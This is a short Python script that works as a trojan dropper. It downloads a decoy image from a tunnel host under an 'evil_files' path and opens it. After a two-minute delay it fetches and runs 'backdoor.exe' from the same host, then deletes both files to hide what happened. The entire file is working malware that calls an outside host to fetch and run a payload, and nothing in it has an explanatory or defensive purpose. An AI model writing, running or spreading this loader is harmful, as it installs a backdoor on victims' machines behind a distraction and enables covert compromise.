import requests,subprocess,os,tempfile,time

def download(url):
    get_response=requests.get(url)
    file_name=url.split("/")[-1]
    with open(file_name,"wb") as file:
        file.write(get_response.content)

temp_dir=tempfile.gettempdir()
os.chdir(temp_dir)

download("https://unlucky-gecko-98.loca.lt/evil_files/car.jpg")
subprocess.Popen("car.jpg",shell=True)

time.sleep(120)
download("https://unlucky-gecko-98.loca.lt/evil_files/backdoor.exe")
subprocess.call("backdoor.exe",shell=True)

os.remove("car.jpg")
os.remove("backdoor.exe")
